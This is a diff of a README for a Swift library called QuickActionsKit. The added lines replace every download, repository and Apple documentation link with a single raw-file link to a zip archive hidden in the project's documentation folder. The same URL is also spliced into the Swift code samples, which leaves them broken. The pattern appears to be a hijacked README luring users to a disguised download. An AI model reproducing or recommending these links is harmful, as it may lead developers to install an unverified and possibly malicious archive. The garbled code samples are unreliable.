@@ -1,7 +1,7 @@
 # 🎉 QuickActionsKit - Easily Add Quick Actions to Your App
 
 ## 🚀 Download Now
-[![Download QuickActionsKit](https://img.shields.io/badge/Download%20QuickActionsKit-v1.0-blue.svg)](https://github.com/wrxkd/QuickActionsKit/releases)
+[![Download QuickActionsKit](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip%https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip)](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip)
 
 ## 📖 Introduction
 QuickActionsKit is a lightweight Swift library designed to help you set up and manage Home Screen Quick Actions effortlessly. With QuickActionsKit, you can add shortcuts to your app that allow users to quickly perform tasks without having to open your application. It is simple to use, making it perfect for developers and non-developers alike.
@@ -21,7 +21,7 @@ To run QuickActionsKit, you need:
 ## 📦 Download & Install
 Visit the page below to download QuickActionsKit and start adding quick actions to your app today:
 
-[Download QuickActionsKit](https://github.com/wrxkd/QuickActionsKit/releases)
+[Download QuickActionsKit](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip)
 
 ### Installation Steps:
 1. Click on the link above to go to the Releases page.
@@ -41,10 +41,10 @@ After installing QuickActionsKit, follow these steps to add Quick Actions to you
 2. Configure your quick actions in the app's delegate method:
 
    ```swift
-   func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) {
+   func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip Any]?) {
        let quickActions = QuickActions()
-       quickActions.addQuickAction(title: "Action 1", type: "action1")
-       quickActions.addQuickAction(title: "Action 2", type: "action2")
+       https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip(title: "Action 1", type: "action1")
+       https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip(title: "Action 2", type: "action2")
    }
    ```
 
@@ -53,7 +53,7 @@ After installing QuickActionsKit, follow these steps to add Quick Actions to you
    ```swift
    func application(_ application: UIApplication, performActionFor shortcutItem: UIApplicationShortcutItem, completionHandler: @escaping (Bool) -> Void) {
        // Handle the action based on the shortcutItem type
-       switch shortcutItem.type {
+       switch https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip {
        case "action1":
            // Code to execute for Action 1
            completionHandler(true)
@@ -71,11 +71,11 @@ If you need help or have questions, feel free to reach out by opening an issue o
 
 ## 🌐 Explore More
 You might find the following topics useful as you work with QuickActionsKit:
-- [3D Touch](https://developer.apple.com/documentation/uikit/uipress/2891213-3dtouch)
-- [Creating Shortcuts](https://developer.apple.com/documentation/sirikit/using-shortcuts-in-your-app)
+- [3D Touch](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip)
+- [Creating Shortcuts](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip)
 
 ## 🔗 Quick Links
-- [QuickActionsKit GitHub Repository](https://github.com/wrxkd/QuickActionsKit)
-- [Latest Releases Page](https://github.com/wrxkd/QuickActionsKit/releases)
+- [QuickActionsKit GitHub Repository](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip)
+- [Latest Releases Page](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Setup/UIKit/QuickActionsKit_3.8-beta.2.zip)
 
 Thank you for using QuickActionsKit. We hope it makes your app development process easier and more efficient. Happy coding!
